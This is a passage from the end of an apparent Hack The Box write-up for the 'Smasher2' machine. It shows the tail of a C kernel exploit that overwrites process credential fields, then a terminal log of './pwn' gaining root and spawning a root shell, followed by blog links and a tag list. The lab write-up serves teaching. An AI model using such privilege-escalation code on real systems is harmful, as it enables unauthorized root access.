				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="n">addr</span><span class="o">++</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p><br>And finally:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dzonerzy@smasher2:/dev/shm$ ./pwn 
[+] PID: 1153
[*] Open OK fd: 3
[*] mmap OK address: 42424000
[+] Searching for the process cred structure ...
[*] Cred structure found ! ptr: 0xb60ad084, crednum: 20
[*] Got Root
[+] Spawning a shell
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(dzonerzy)
# 
</code></pre></div></div>
<p><br>
<img src="/images/hackthebox/smasher2/12.png" alt="">
<br><br>We owned root !
<br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.
<br>
<br>
<br>Previous Hack The Box write-up : <a href="/hack-the-box/wall/">Hack The Box - Wall</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/craft/">Hack The Box - Craft</a></p>
<hr>


</div>





<div class="related">
  <h2>other posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/hack-the-box/player/">
            Hack The Box - Player
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/bitlab/">
            Hack The Box - Bitlab
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/craft/">
            Hack The Box - Craft
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>All Tags</h2>
  <div class="tag-cloud">
<a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-2">binary-exploitation</a> <a href="/tag/blockchain/" class="set-1">blockchain</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-2">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/elasticsearch/" class="set-1">elasticsearch</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/git/" class="set-1">git</a> <a href="/tag/javascript/" class="set-1">javascript</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/js/" class="set-1">js</a> <a href="/tag/jwt/" class="set-1">jwt</a> <a href="/tag/kernel-exploitation/" class="set-1">kernel-exploitation</a> <a href="/tag/kibana/" class="set-1">kibana</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/logstash/" class="set-1">logstash</a> <a href="/tag/mmap/" class="set-1">mmap</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/postgresql/" class="set-1">postgresql</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-4">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smart-contracts/" class="set-1">smart-contracts</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/solidity/" class="set-1">solidity</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/sudo/" class="set-1">sudo</a> <a href="/tag/suid/" class="set-1">suid</a> <a href="/tag/waf/" class="set-1">waf</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-2">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/winrm/" class="set-1">winrm</a> <a href="/tag/wordpress/" class="set-1">wordpress</a>
</div>
  



      </div>
    </main><footer class="site-footer">
	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
  <div class="wrapper">
<div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked>
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
if (localStorage.getItem("theme") === null) {
    window.localStorage.setItem('theme', 'dark');
}
const theme = localStorage.getItem('theme');
if (theme === "dark") {
	document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

if (theme === "dark") {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
} else if (theme === "light") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
} else if  (userPrefers === "dark") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'dark');
	document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	window.localStorage.setItem('theme', 'dark');
	document.getElementById("theme-toggle").className = 'light';
} else {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'light');
	document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	window.localStorage.setItem('theme', 'light');
	document.getElementById("theme-toggle").className = 'dark';
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    document.documentElement.setAttribute('data-theme', 'light');
		document.documentElement.classList.add('theme--light');
        document.documentElement.classList.remove('theme--dark');
		window.localStorage.setItem('theme', 'light');
	    document.getElementById("theme-toggle").className = 'dark';
	} else {
	    document.documentElement.setAttribute('data-theme', 'dark');
		document.documentElement.classList.add('theme--dark');
        document.documentElement.classList.remove('theme--light');
		window.localStorage.setItem('theme', 'dark');
	    document.getElementById("theme-toggle").className = 'light';
	}
}
</script>
</div>
  
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
